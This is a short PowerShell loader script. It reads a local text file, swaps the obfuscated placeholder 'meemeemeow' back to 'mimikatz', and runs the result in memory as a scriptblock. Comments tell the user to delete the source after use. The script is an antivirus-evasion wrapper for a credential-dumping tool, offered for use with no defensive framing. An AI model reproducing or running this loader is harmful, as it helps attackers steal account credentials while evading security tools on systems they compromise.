# OFFLINE, LOCAL CODE FILE NEEDED, DELETE SOURCE CODE AFTER USE
# Manually loads code into memory, compatible with older systems/ps3
# Copy/paste into ps to load code, invoke after code loaded
# Invoke-Clist

# Modify file path as needed
$strCPath = (get-location).path + "\clist.txt"
$strCode = [io.file]::ReadAllText($strCPath)
$strCode = $strCode -replace "Nooote", "NoteProperty"
$strCode = $strCode -replace "meemeemeow", "mimikatz"
$strCode = [scriptblock]::Create($strCode)
.$strCode
